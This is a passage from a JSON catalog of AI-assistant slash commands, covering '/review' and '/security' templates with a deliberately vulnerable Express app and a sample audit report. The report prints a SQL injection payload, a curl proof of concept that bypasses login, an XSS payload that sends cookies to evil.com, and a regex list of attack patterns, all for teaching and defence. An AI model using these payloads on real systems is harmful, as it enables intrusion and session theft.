password: process.env.DB_PASSWORD,\n  ssl: true,\n  connectionLimit: 10\n};\nthis.database = new Database(dbConfig);\n```\n\n### 3. Missing Input Validation\n**Location:** Line 7  \n**Severity:** Critical  \n**Category:** Security  \n\n**Issue:** No validation of user input allows injection of malicious data.\n\n```javascript\n// ‚úÖ Recommended implementation\nconst Joi = require('joi');\n\nconst userSchema = Joi.object({\n  name: Joi.string().alphanum().min(2).max(50).required(),\n  email: Joi.string().email().required(),\n  age: Joi.number().integer().min(13).max(120)\n});\n\nasync createUser(userData) {\n  const { error, value } = userSchema.validate(userData);\n  if (error) {\n    throw new ValidationError('Invalid user data', error.details);\n  }\n  // Continue with validated data...\n}\n```\n\n### 4. Weak ID Generation\n**Location:** Line 9  \n**Severity:** High  \n**Category:** Security  \n\n**Issue:** Math.random() is predictable and not suitable for ID generation.\n\n```javascript\n// ‚ùå Vulnerable code\nid: Math.random()\n\n// ‚úÖ Recommended fix\nconst { v4: uuidv4 } = require('uuid');\nid: uuidv4()\n\n// Or for numeric IDs:\nconst crypto = require('crypto');\nid: crypto.randomBytes(16).toString('hex')\n```\n\n## ‚ö†Ô∏è High Priority Issues (2)\n\n### 5. Missing Access Control\n**Location:** Line 25  \n**Severity:** High  \n**Category:** Security  \n\n**Issue:** No authorization checks allow any user to delete any other user.\n\n```javascript\n// ‚úÖ Recommended implementation\nasync deleteUser(userId, requestingUserId, userRole) {\n  // Check if user can delete (self or admin)\n  if (userId !== requestingUserId && userRole !== 'admin') {\n    throw new AuthorizationError('Insufficient permissions');\n  }\n  \n  // Additional checks...\n}\n```\n\n### 6. Type Safety Issue\n**Location:** Line 26  \n**Severity:** High  \n**Category:** Quality  \n\n**Issue:** Using loose equality (==) instead of strict equality (===).\n\n```javascript\n// ‚ùå Problematic code\nconst index = this.users.findIndex(u => u.id == userId);\n\n// ‚úÖ Recommended fix\nconst index = this.users.findIndex(u => u.id === userId);\n```\n\n## üìä Performance Issues (1)\n\n### 7. Inefficient Search Algorithm\n**Location:** Line 33  \n**Severity:** Medium  \n**Category:** Performance  \n\n**Issue:** O(n) search operation doesn't scale with large user datasets.\n\n```javascript\n// ‚úÖ Optimized implementation\nclass UserService {\n  constructor() {\n    this.users = [];\n    this.userIndex = new Map(); // For fast lookups\n    this.searchIndex = {}; // For text search\n  }\n  \n  async searchUsers(query, limit = 20, offset = 0) {\n    // Use database query for large datasets\n    const sql = `\n      SELECT * FROM users \n      WHERE MATCH(name, email) AGAINST (? IN NATURAL LANGUAGE MODE)\n      LIMIT ? OFFSET ?\n    `;\n    return await this.database.query(sql, [query, limit, offset]);\n  }\n}\n```\n\n## üèóÔ∏è Architecture Recommendations\n\n### 1. Separation of Concerns\n```javascript\n// ‚úÖ Improved architecture\nclass UserService {\n  constructor(userRepository, validator, logger) {\n    this.userRepository = userRepository;\n    this.validator = validator;\n    this.logger = logger;\n  }\n}\n\nclass UserRepository {\n  constructor(database) {\n    this.database = database;\n  }\n  \n  async create(userData) {\n    const query = 'INSERT INTO users (id, name, email, created_at) VALUES (?, ?, ?, ?)';\n    return await this.database.query(query, [\n      userData.id,\n      userData.name,\n      userData.email,\n      userData.createdAt\n    ]);\n  }\n}\n```\n\n### 2. Error Handling\n```javascript\n// ‚úÖ Proper error handling\nclass UserService {\n  async createUser(userData) {\n    try {\n      await this.validator.validate(userData);\n      const user = await this.userRepository.create(userData);\n      this.logger.info('User created successfully', { userId: user.id });\n      return user;\n    } catch (error) {\n      this.logger.error('Failed to create user', { error: error.message, userData });\n      \n      if (error instanceof ValidationError) {\n        throw new BadRequestError('Invalid user data', error.details);\n      }\n      \n      throw new InternalServerError('Failed to create user');\n    }\n  }\n}\n```\n\n## üß™ Testing Recommendations\n\n```javascript\n// ‚úÖ Comprehensive test suite\ndescribe('UserService', () => {\n  let userService, mockRepository, mockValidator;\n  \n  beforeEach(() => {\n    mockRepository = {\n      create: jest.fn(),\n      findById: jest.fn(),\n      delete: jest.fn()\n    };\n    mockValidator = {\n      validate: jest.fn()\n    };\n    userService = new UserService(mockRepository, mockValidator);\n  });\n  \n  describe('createUser', () => {\n    it('should create user with valid data', async () => {\n      const userData = { name: 'John Doe', email: 'john@example.com' };\n      mockValidator.validate.mockResolvedValue(userData);\n      mockRepository.create.mockResolvedValue({ id: '123', ...userData });\n      \n      const result = await userService.createUser(userData);\n      \n      expect(result.id).toBe('123');\n      expect(mockRepository.create).toHaveBeenCalledWith(userData);\n    });\n    \n    it('should throw error for invalid data', async () => {\n      mockValidator.validate.mockRejectedValue(new ValidationError('Invalid email'));\n      \n      await expect(userService.createUser({ email: 'invalid' }))\n        .rejects.toThrow(BadRequestError);\n    });\n    \n    it('should handle SQL injection attempts', async () => {\n      const maliciousData = {\n        name: \"'; DROP TABLE users; --\",\n        email: 'test@example.com'\n      };\n      \n      // Should be caught by validation\n      mockValidator.validate.mockRejectedValue(new ValidationError('Invalid characters'));\n      \n      await expect(userService.createUser(maliciousData))\n        .rejects.toThrow(BadRequestError);\n    });\n  });\n});\n```\n\n## üìã Security Checklist\n\n- [ ] **Input Validation**: Implement comprehensive input validation\n- [ ] **SQL Injection**: Use parameterized queries\n- [ ] **Authentication**: Add proper user authentication\n- [ ] **Authorization**: Implement role-based access control\n- [ ] **Encryption**: Encrypt sensitive data at rest and in transit\n- [ ] **Logging**: Add security event logging\n- [ ] **Rate Limiting**: Implement API rate limiting\n- [ ] **CORS**: Configure CORS policies appropriately\n- [ ] **Headers**: Set security headers (HSTS, CSP, etc.)\n- [ ] **Dependencies**: Audit and update dependencies regularly\n\n## üìà Performance Optimizations\n\n1. **Database Indexing**\n   ```sql\n   CREATE INDEX idx_users_email ON users(email);\n   CREATE INDEX idx_users_name ON users(name);\n   CREATE FULLTEXT INDEX idx_users_search ON users(name, email);\n   ```\n\n2. **Caching Strategy**\n   ```javascript\n   const cache = new Redis();\n   \n   async getUser(id) {\n     const cached = await cache.get(`user:${id}`);\n     if (cached) return JSON.parse(cached);\n     \n     const user = await this.userRepository.findById(id);\n     await cache.setex(`user:${id}`, 3600, JSON.stringify(user));\n     return user;\n   }\n   ```\n\n3. **Connection Pooling**\n   ```javascript\n   const pool = new Pool({\n     host: 'localhost',\n     user: 'user',\n     password: 'password',\n     database: 'myapp',\n     connectionLimit: 10,\n     acquireTimeout: 60000,\n     timeout: 60000\n   });\n   ```\n\n## üîß Configuration\n\n```javascript\n// ‚úÖ Environment-based configuration\nconst config = {\n  database: {\n    host: process.env.DB_HOST || 'localhost',\n    port: parseInt(process.env.DB_PORT) || 5432,\n    username: process.env.DB_USERNAME,\n    password: process.env.DB_PASSWORD,\n    database: process.env.DB_NAME,\n    ssl: process.env.NODE_ENV === 'production',\n    pool: {\n      min: 2,\n      max: 10,\n      acquire: 30000,\n      idle: 10000\n    }\n  },\n  security: {\n    jwtSecret: process.env.JWT_SECRET,\n    bcryptRounds: 12,\n    rateLimitWindowMs: 15 * 60 * 1000, // 15 minutes\n    rateLimitMax: 100 // requests per window\n  },\n  validation: {\n    nameMinLength: 2,\n    nameMaxLength: 50,\n    passwordMinLength: 8,\n    emailDomainWhitelist: process.env.ALLOWED_EMAIL_DOMAINS?.split(',')\n  }\n};\n```\n\n## Summary\n\n**Issues Found:** 7  \n**Critical:** 4  \n**High:** 2  \n**Medium:** 1  \n\n**Primary Concerns:**\n1. Critical security vulnerabilities (SQL injection, exposed credentials)\n2. Missing input validation and access controls\n3. Poor error handling and logging\n4. Performance bottlenecks in search functionality\n\n**Recommended Actions:**\n1. **Immediate:** Fix SQL injection and input validation (Critical)\n2. **High Priority:** Implement access controls and proper ID generation\n3. **Medium Priority:** Optimize search performance and add comprehensive testing\n4. **Long Term:** Refactor architecture for better separation of concerns\n\n**Estimated Effort:** 2-3 days for critical fixes, 1-2 weeks for complete refactoring\n```\n\n## Advanced Analysis Features\n\n### Machine Learning Insights\n- **Code Smell Detection**: Identify potential design issues\n- **Bug Prediction**: Predict likely bug locations based on complexity\n- **Refactoring Suggestions**: AI-powered code improvement recommendations\n- **Security Pattern Recognition**: Detect known vulnerability patterns\n\n### Integration Capabilities\n- **CI/CD Pipeline**: Integrate with GitHub Actions, Jenkins, GitLab CI\n- **IDE Extensions**: Support for VS Code, IntelliJ, Vim\n- **Code Quality Gates**: Block deployments on critical issues\n- **Team Collaboration**: Share reviews and track improvements\n\n### Custom Rule Sets\n```yaml\n# .claudereview.yml\nrules:\n  security:\n    - no-sql-injection\n    - require-input-validation\n    - no-hardcoded-secrets\n    - require-https\n  \n  performance:\n    - no-n-plus-one-queries\n    - require-database-indexes\n    - limit-memory-usage\n  \n  style:\n    - consistent-naming\n    - max-function-length: 50\n    - max-file-length: 500\n    - require-documentation\n\nignore:\n  - \"*.test.js\"\n  - \"node_modules/**\"\n  - \"dist/**\"\n\nthresholds:\n  critical: 0\n  high: 5\n  medium: 20\n```",
      "configuration": {
        "temperature": 0.2,
        "maxTokens": 12000,
        "systemPrompt": "You are an expert code reviewer with deep knowledge of security, performance, and best practices across multiple programming languages. Provide comprehensive, actionable feedback with specific examples and fixes."
      },
      "githubUrl": "https://github.com/claudepro/code-reviewer",
      "documentationUrl": "https://docs.claude.ai/commands/review",
      "source": "community",
      "slug": "review",
      "type": "command",
      "url": "https://claudepro.directory/commands/review"
    },
    {
      "title": "/security",
      "description": "Comprehensive security audit with vulnerability detection, threat analysis, and automated remediation recommendations",
      "category": "commands",
      "author": "claudepro",
      "dateAdded": "2025-09-16",
      "tags": [
        "security",
        "audit",
        "vulnerability",
        "threat-analysis",
        "penetration-testing"
      ],
      "content": "The `/security` command provides comprehensive security auditing including vulnerability scanning, threat modeling, penetration testing, compliance checking, and automated security hardening recommendations.\n\n## Usage\n\n```\n/security [options] <file_or_project>\n```\n\n## Options\n\n### Audit Types\n- `--vulnerability` - OWASP Top 10 and CVE scanning\n- `--authentication` - Auth and session security analysis\n- `--authorization` - Access control and permissions audit\n- `--data-protection` - Encryption and data security review\n- `--infrastructure` - Server and network security assessment\n- `--compliance` - SOC2, GDPR, HIPAA compliance checking\n- `--all` - Comprehensive security audit (default)\n\n### Scan Depth\n- `--surface` - Quick surface-level scan\n- `--deep` - Comprehensive deep analysis\n- `--penetration` - Simulated attack testing\n- `--compliance` - Regulatory compliance audit\n\n### Threat Modeling\n- `--stride` - STRIDE threat modeling framework\n- `--attack-tree` - Generate attack tree analysis\n- `--risk-assessment` - Quantitative risk analysis\n- `--threat-intelligence` - Latest threat intelligence integration\n\n### Output Formats\n- `--format=report` - Detailed security report (default)\n- `--format=sarif` - SARIF format for CI/CD integration\n- `--format=json` - Machine-readable JSON output\n- `--format=executive` - Executive summary for stakeholders\n\n## Examples\n\n### Web Application Security Audit\n\n```javascript\n// Vulnerable web application with multiple security issues\nconst express = require('express');\nconst mysql = require('mysql');\nconst bcrypt = require('bcrypt');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\n// üö® Security Issue 1: No rate limiting\napp.use(express.json());\n\n// üö® Security Issue 2: Hardcoded database credentials\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password123', // üö® Hardcoded password\n  database: 'myapp'\n});\n\n// üö® Security Issue 3: Weak JWT secret\nconst JWT_SECRET = 'secret'; // üö® Weak secret\n\n// üö® Security Issue 4: SQL Injection vulnerability\napp.post('/login', async (req, res) => {\n  const { email, password } = req.body;\n  \n  // üö® Direct string interpolation - SQL injection risk\n  const query = `SELECT * FROM users WHERE email = '${email}'`;\n  \n  db.query(query, async (err, results) => {\n    if (err) {\n      // üö® Security Issue 5: Information disclosure\n      return res.status(500).json({ error: err.message });\n    }\n    \n    if (results.length === 0) {\n      // üö® Security Issue 6: User enumeration\n      return res.status(401).json({ error: 'Invalid email' });\n    }\n    \n    const user = results[0];\n    \n    // üö® Security Issue 7: Timing attack vulnerability\n    if (await bcrypt.compare(password, user.password)) {\n      const token = jwt.sign(\n        { userId: user.id, email: user.email },\n        JWT_SECRET // üö® Weak secret\n      );\n      \n      // üö® Security Issue 8: Sensitive data in token\n      res.json({ token, user: user }); // üö® Exposes password hash\n    } else {\n      res.status(401).json({ error: 'Invalid password' });\n    }\n  });\n});\n\n// üö® Security Issue 9: Missing authentication middleware\napp.get('/admin/users', (req, res) => {\n  const query = 'SELECT * FROM users';\n  \n  db.query(query, (err, results) => {\n    if (err) {\n      return res.status(500).json({ error: err.message });\n    }\n    \n    // üö® Security Issue 10: No access control\n    res.json(results); // üö® Exposes all user data including passwords\n  });\n});\n\n// üö® Security Issue 11: XSS vulnerability\napp.get('/search', (req, res) => {\n  const { q } = req.query;\n  \n  // üö® Direct output without sanitization\n  res.send(`<h1>Search results for: ${q}</h1>`);\n});\n\n// üö® Security Issue 12: CSRF vulnerability (no CSRF protection)\napp.post('/transfer-money', (req, res) => {\n  const { to, amount } = req.body;\n  \n  // üö® No CSRF token validation\n  // Process money transfer...\n  \n  res.json({ success: true });\n});\n\n// üö® Security Issue 13: Missing security headers\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});\n```\n\n**Security Audit Report:**\n\n```markdown\n# üîí Security Audit Report\n\n## üö® Critical Vulnerabilities (13 issues found)\n\n### 1. SQL Injection (CRITICAL - CWE-89)\n**Location:** `/login` endpoint, line 18  \n**CVSS Score:** 9.8 (Critical)  \n**Attack Vector:** Network  \n**Impact:** Complete database compromise\n\n**Vulnerability:**\n```javascript\n// ‚ùå Vulnerable code\nconst query = `SELECT * FROM users WHERE email = '${email}'`;\n\n// üö® Attack payload:\n// email: \"' OR '1'='1' UNION SELECT username, password FROM admin_users --\"\n```\n\n**Proof of Concept:**\n```bash\ncurl -X POST http://localhost:3000/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\": \"\\047 OR 1=1 --\", \"password\": \"anything\"}'\n\n# Result: Bypasses authentication and may expose user data\n```\n\n**Impact:**\n- Complete database access\n- User credential theft\n- Data manipulation/deletion\n- Administrative access escalation\n\n**Remediation:**\n```javascript\n// ‚úÖ Secure implementation with parameterized queries\napp.post('/login', async (req, res) => {\n  const { email, password } = req.body;\n  \n  // Input validation\n  if (!email || !password) {\n    return res.status(400).json({ error: 'Email and password required' });\n  }\n  \n  // Email format validation\n  const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;\n  if (!emailRegex.test(email)) {\n    return res.status(400).json({ error: 'Invalid email format' });\n  }\n  \n  try {\n    // ‚úÖ Parameterized query prevents SQL injection\n    const query = 'SELECT id, email, password, role FROM users WHERE email = ? AND active = 1';\n    const results = await db.promise().query(query, [email]);\n    \n    if (results[0].length === 0) {\n      // ‚úÖ Generic error message prevents user enumeration\n      return res.status(401).json({ error: 'Invalid credentials' });\n    }\n    \n    const user = results[0][0];\n    \n    // ‚úÖ Secure password comparison\n    const isValidPassword = await bcrypt.compare(password, user.password);\n    \n    if (!isValidPassword) {\n      // ‚úÖ Same error message for failed password\n      return res.status(401).json({ error: 'Invalid credentials' });\n    }\n    \n    // ‚úÖ Secure token generation\n    const token = jwt.sign(\n      { \n        userId: user.id, \n        email: user.email,\n        role: user.role \n      },\n      process.env.JWT_SECRET, // ‚úÖ Strong secret from environment\n      { \n        expiresIn: '1h',\n        issuer: 'myapp',\n        audience: 'myapp-users'\n      }\n    );\n    \n    // ‚úÖ Don't expose sensitive data\n    res.json({ \n      token,\n      user: {\n        id: user.id,\n        email: user.email,\n        role: user.role\n      }\n    });\n    \n    // ‚úÖ Log successful login for monitoring\n    console.log(`User ${user.email} logged in successfully`);\n    \n  } catch (error) {\n    console.error('Login error:', error);\n    // ‚úÖ Generic error message\n    res.status(500).json({ error: 'Internal server error' });\n  }\n});\n```\n\n### 2. Hardcoded Credentials (HIGH - CWE-798)\n**Location:** Database connection, line 9  \n**CVSS Score:** 8.5 (High)  \n**Impact:** Database access, credential exposure in source code\n\n**Vulnerability:**\n```javascript\n// ‚ùå Hardcoded credentials in source code\nconst db = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: 'password123', // üö® Exposed in version control\n  database: 'myapp'\n});\n```\n\n**Remediation:**\n```javascript\n// ‚úÖ Environment-based configuration\nrequire('dotenv').config();\n\nconst db = mysql.createConnection({\n  host: process.env.DB_HOST || 'localhost',\n  user: process.env.DB_USER,\n  password: process.env.DB_PASSWORD,\n  database: process.env.DB_NAME,\n  ssl: process.env.NODE_ENV === 'production' ? {\n    rejectUnauthorized: true,\n    ca: fs.readFileSync(process.env.DB_SSL_CA),\n    cert: fs.readFileSync(process.env.DB_SSL_CERT),\n    key: fs.readFileSync(process.env.DB_SSL_KEY)\n  } : false,\n  acquireTimeout: 60000,\n  timeout: 60000,\n  reconnect: true\n});\n\n// ‚úÖ Environment file (.env) - not committed to version control\n/*\nDB_HOST=secure-db.company.com\nDB_USER=app_user\nDB_PASSWORD=x$9mK#p2L@8nQ5vR\nDB_NAME=production_db\nDB_SSL_CA=/path/to/ca-cert.pem\nDB_SSL_CERT=/path/to/client-cert.pem\nDB_SSL_KEY=/path/to/client-key.pem\nJWT_SECRET=aB3dF6hJ9kL2nP5sT8wZ1cE4gI7mQ0uX\n*/\n```\n\n### 3. Cross-Site Scripting (XSS) (HIGH - CWE-79)\n**Location:** `/search` endpoint, line 44  \n**CVSS Score:** 8.2 (High)  \n**Impact:** Session hijacking, credential theft, malware distribution\n\n**Vulnerability:**\n```javascript\n// ‚ùå Direct output without sanitization\napp.get('/search', (req, res) => {\n  const { q } = req.query;\n  res.send(`<h1>Search results for: ${q}</h1>`);\n});\n\n// üö® Attack payload:\n// GET /search?q=<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>\n```\n\n**Proof of Concept:**\n```bash\n# XSS payload that steals cookies\ncurl \"http://localhost:3000/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E\"\n\n# Result: JavaScript execution in victim's browser\n```\n\n**Remediation:**\n```javascript\nconst DOMPurify = require('dompurify');\nconst { JSDOM } = require('jsdom');\n\nconst window = new JSDOM('').window;\nconst purify = DOMPurify(window);\n\napp.get('/search', (req, res) => {\n  const { q } = req.query;\n  \n  // ‚úÖ Input validation\n  if (!q || typeof q !== 'string') {\n    return res.status(400).json({ error: 'Invalid search query' });\n  }\n  \n  // ‚úÖ Sanitize user input\n  const sanitizedQuery = purify.sanitize(q);\n  \n  // ‚úÖ Use template engine with auto-escaping\n  res.render('search-results', {\n    query: sanitizedQuery,\n    results: performSearch(sanitizedQuery)\n  });\n});\n\n// ‚úÖ Alternative: JSON API response (safer)\napp.get('/api/search', (req, res) => {\n  const { q } = req.query;\n  \n  if (!q || typeof q !== 'string' || q.length > 100) {\n    return res.status(400).json({ error: 'Invalid search query' });\n  }\n  \n  const results = performSearch(q); // Search function handles sanitization\n  \n  res.json({\n    query: q,\n    results: results,\n    total: results.length\n  });\n});\n```\n\n### 4. Missing Authentication & Authorization (HIGH - CWE-862)\n**Location:** `/admin/users` endpoint, line 37  \n**CVSS Score:** 8.0 (High)  \n**Impact:** Unauthorized data access, privilege escalation\n\n**Remediation:**\n```javascript\nconst rateLimit = require('express-rate-limit');\nconst helmet = require('helmet');\n\n// ‚úÖ Security middleware\napp.use(helmet({\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc: [\"'self'\"],\n      styleSrc: [\"'self'\", \"'unsafe-inline'\"],\n      scriptSrc: [\"'self'\"],\n      imgSrc: [\"'self'\", \"data:\", \"https:\"],\n    },\n  },\n  hsts: {\n    maxAge: 31536000,\n    includeSubDomains: true,\n    preload: true\n  }\n}));\n\n// ‚úÖ Rate limiting\nconst authLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 5, // 5 attempts per window\n  message: 'Too many login attempts, please try again later',\n  standardHeaders: true,\n  legacyHeaders: false,\n});\n\nconst apiLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 100, // 100 requests per window\n  message: 'Too many requests, please try again later'\n});\n\napp.use('/login', authLimiter);\napp.use('/api/', apiLimiter);\n\n// ‚úÖ Authentication middleware\nconst authenticateToken = (req, res, next) => {\n  const authHeader = req.headers['authorization'];\n  const token = authHeader && authHeader.split(' ')[1];\n  \n  if (!token) {\n    return res.status(401).json({ error: 'Access token required' });\n  }\n  \n  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {\n    if (err) {\n      return res.status(403).json({ error: 'Invalid or expired token' });\n    }\n    \n    req.user = user;\n    next();\n  });\n};\n\n// ‚úÖ Authorization middleware\nconst requireRole = (roles) => {\n  return (req, res, next) => {\n    if (!req.user) {\n      return res.status(401).json({ error: 'Authentication required' });\n    }\n    \n    if (!roles.includes(req.user.role)) {\n      return res.status(403).json({ error: 'Insufficient permissions' });\n    }\n    \n    next();\n  };\n};\n\n// ‚úÖ Secure admin endpoint\napp.get('/admin/users', \n  authenticateToken, \n  requireRole(['admin', 'moderator']), \n  async (req, res) => {\n    try {\n      // ‚úÖ Parameterized query with limited fields\n      const query = `\n        SELECT id, email, role, created_at, last_login, active \n        FROM users \n        ORDER BY created_at DESC \n        LIMIT ? OFFSET ?\n      `;\n      \n      const page = parseInt(req.query.page) || 1;\n      const limit = Math.min(parseInt(req.query.limit) || 20, 100);\n      const offset = (page - 1) * limit;\n      \n      const [users, totalCount] = await Promise.all([\n        db.promise().query(query, [limit, offset]),\n        db.promise().query('SELECT COUNT(*) as total FROM users')\n      ]);\n      \n      // ‚úÖ Audit log\n      console.log(`Admin ${req.user.email} accessed user list`);\n      \n      res.json({\n        users: users[0],\n        pagination: {\n          page,\n          limit,\n          total: totalCount[0][0].total,\n          totalPages: Math.ceil(totalCount[0][0].total / limit)\n        }\n      });\n      \n    } catch (error) {\n      console.error('Admin users query error:', error);\n      res.status(500).json({ error: 'Internal server error' });\n    }\n  }\n);\n```\n\n### 5. Cross-Site Request Forgery (CSRF) (MEDIUM - CWE-352)\n**Location:** `/transfer-money` endpoint, line 50  \n**CVSS Score:** 6.8 (Medium)  \n**Impact:** Unauthorized actions on behalf of authenticated users\n\n**Remediation:**\n```javascript\nconst csrf = require('csurf');\nconst cookieParser = require('cookie-parser');\n\napp.use(cookieParser());\n\n// ‚úÖ CSRF protection\nconst csrfProtection = csrf({ \n  cookie: {\n    httpOnly: true,\n    secure: process.env.NODE_ENV === 'production',\n    sameSite: 'strict'\n  }\n});\n\napp.use(csrfProtection);\n\n// ‚úÖ Provide CSRF token to frontend\napp.get('/api/csrf-token', (req, res) => {\n  res.json({ csrfToken: req.csrfToken() });\n});\n\n// ‚úÖ Protected financial endpoint\napp.post('/transfer-money', \n  authenticateToken,\n  requireRole(['user', 'premium']),\n  async (req, res) => {\n    const { to, amount, description } = req.body;\n    \n    try {\n      // ‚úÖ Input validation\n      if (!to || !amount || amount <= 0) {\n        return res.status(400).json({ error: 'Invalid transfer parameters' });\n      }\n      \n      if (amount > 10000) {\n        return res.status(400).json({ error: 'Transfer limit exceeded' });\n      }\n      \n      // ‚úÖ Additional verification for large amounts\n      if (amount > 1000) {\n        const twoFACode = req.body.twoFactorCode;\n        if (!twoFACode || !verifyTwoFactorCode(req.user.id, twoFACode)) {\n          return res.status(403).json({ error: 'Two-factor authentication required' });\n        }\n      }\n      \n      // ‚úÖ Database transaction for atomicity\n      await db.promise().beginTransaction();\n      \n      const transferResult = await processMoneyTransfer({\n        from: req.user.id,\n        to,\n        amount,\n        description\n      });\n      \n      await db.promise().commit();\n      \n      // ‚úÖ Audit log\n      console.log(`Transfer: ${req.user.email} sent $${amount} to ${to}`);\n      \n      res.json({ \n        success: true, \n        transactionId: transferResult.id,\n        message: 'Transfer completed successfully'\n      });\n      \n    } catch (error) {\n      await db.promise().rollback();\n      console.error('Transfer error:', error);\n      res.status(500).json({ error: 'Transfer failed' });\n    }\n  }\n);\n```\n\n## üõ°Ô∏è Security Hardening Recommendations\n\n### 1. Infrastructure Security\n\n```yaml\n# ‚úÖ Docker security configuration\n# Dockerfile\nFROM node:18-alpine AS base\n\n# Create non-root user\nRUN addgroup -g 1001 -S nodejs\nRUN adduser -S nodeuser -u 1001\n\n# Set working directory\nWORKDIR /app\n\n# Copy package files\nCOPY package*.json ./\n\n# Install dependencies\nRUN npm ci --only=production && npm cache clean --force\n\n# Copy application code\nCOPY . .\n\n# Change ownership to non-root user\nRUN chown -R nodeuser:nodejs /app\n\n# Switch to non-root user\nUSER nodeuser\n\n# Expose port\nEXPOSE 3000\n\n# Health check\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n  CMD curl -f http://localhost:3000/health || exit 1\n\nCMD [\"node\", \"server.js\"]\n```\n\n```yaml\n# ‚úÖ Kubernetes security configuration\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: secure-app\nspec:\n  template:\n    spec:\n      serviceAccountName: app-service-account\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 1001\n        runAsGroup: 1001\n        fsGroup: 1001\n      containers:\n      - name: app\n        image: myapp:latest\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          capabilities:\n            drop:\n            - ALL\n        resources:\n          limits:\n            memory: \"512Mi\"\n            cpu: \"500m\"\n          requests:\n            memory: \"256Mi\"\n            cpu: \"250m\"\n        env:\n        - name: DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: db-secret\n              key: password\n        volumeMounts:\n        - name: tmp\n          mountPath: /tmp\n        - name: cache\n          mountPath: /app/cache\n      volumes:\n      - name: tmp\n        emptyDir: {}\n      - name: cache\n        emptyDir: {}\n```\n\n### 2. Network Security\n\n```nginx\n# ‚úÖ Nginx security configuration\nserver {\n    listen 443 ssl http2;\n    server_name example.com;\n    \n    # SSL/TLS configuration\n    ssl_certificate /path/to/cert.pem;\n    ssl_certificate_key /path/to/key.pem;\n    ssl_protocols TLSv1.2 TLSv1.3;\n    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512;\n    ssl_prefer_server_ciphers off;\n    ssl_session_cache shared:SSL:10m;\n    ssl_session_timeout 10m;\n    \n    # Security headers\n    add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;\n    add_header X-Content-Type-Options \"nosniff\" always;\n    add_header X-Frame-Options \"DENY\" always;\n    add_header X-XSS-Protection \"1; mode=block\" always;\n    add_header Referrer-Policy \"strict-origin-when-cross-origin\" always;\n    add_header Content-Security-Policy \"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';\" always;\n    \n    # Rate limiting\n    limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;\n    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;\n    \n    location /login {\n        limit_req zone=login burst=5 nodelay;\n        proxy_pass http://backend;\n    }\n    \n    location /api/ {\n        limit_req zone=api burst=20 nodelay;\n        proxy_pass http://backend;\n    }\n    \n    # Hide server information\n    server_tokens off;\n    \n    # Prevent access to sensitive files\n    location ~ /\\. {\n        deny all;\n    }\n    \n    location ~ \\.(env|config|sql|log)$ {\n        deny all;\n    }\n}\n```\n\n### 3. Database Security\n\n```sql\n-- ‚úÖ Database security hardening\n\n-- Create application-specific user with limited privileges\nCREATE USER 'app_user'@'%' IDENTIFIED BY 'strong_random_password';\n\n-- Grant only necessary permissions\nGRANT SELECT, INSERT, UPDATE, DELETE ON myapp.users TO 'app_user'@'%';\nGRANT SELECT, INSERT, UPDATE, DELETE ON myapp.products TO 'app_user'@'%';\nGRANT SELECT, INSERT, UPDATE, DELETE ON myapp.orders TO 'app_user'@'%';\n\n-- Remove dangerous permissions\nREVOKE FILE ON *.* FROM 'app_user'@'%';\nREVOKE PROCESS ON *.* FROM 'app_user'@'%';\nREVOKE SUPER ON *.* FROM 'app_user'@'%';\n\n-- Enable SSL/TLS\nALTER USER 'app_user'@'%' REQUIRE SSL;\n\n-- Set connection limits\nALTER USER 'app_user'@'%' WITH MAX_CONNECTIONS_PER_HOUR 1000;\nALTER USER 'app_user'@'%' WITH MAX_QUERIES_PER_HOUR 10000;\n\n-- Enable query logging for monitoring\nSET GLOBAL general_log = 'ON';\nSET GLOBAL slow_query_log = 'ON';\nSET GLOBAL long_query_time = 2;\n\n-- Create indexes for performance and prevent enumeration attacks\nCREATE INDEX idx_users_email ON users(email);\nCREATE INDEX idx_users_active ON users(active);\nCREATE INDEX idx_sessions_token ON sessions(token_hash);\n```\n\n### 4. Application Security Monitoring\n\n```javascript\n// ‚úÖ Security monitoring and alerting\nconst winston = require('winston');\nconst rateLimit = require('express-rate-limit');\n\n// Security event logger\nconst securityLogger = winston.createLogger({\n  level: 'info',\n  format: winston.format.combine(\n    winston.format.timestamp(),\n    winston.format.json()\n  ),\n  transports: [\n    new winston.transports.File({ filename: 'security.log' }),\n    new winston.transports.Console()\n  ]\n});\n\n// Security monitoring middleware\nconst securityMonitor = (req, res, next) => {\n  // Log suspicious patterns\n  const suspiciousPatterns = [\n    /script[^>]*>.*<\\/script>/i,\n    /javascript:/i,\n    /on\\w+=/i,\n    /'\\s*(or|and)\\s*'?\\d/i,\n    /union\\s+select/i,\n    /\\/\\*.*\\*\\//,\n    /<iframe/i\n  ];\n  \n  const userInput = JSON.stringify({\n    body: req.body,\n    query: req.query,\n    params: req.params\n  });\n  \n  for (const pattern of suspiciousPatterns) {\n    if (pattern.test(userInput)) {\n      securityLogger.warn('Suspicious input detected', {\n        ip: req.ip,\n        userAgent: req.get('User-Agent'),\n        url: req.originalUrl,\n        method: req.method,\n        input: userInput,\n        pattern: pattern.toString()\n      });\n      \n      // Block obvious attack attempts\n      if (pattern.test(userInput) && req.originalUrl.includes('admin')) {\n        return res.status(403).json({ error: 'Request blocked' });\n      }\n    }\n  }\n  \n  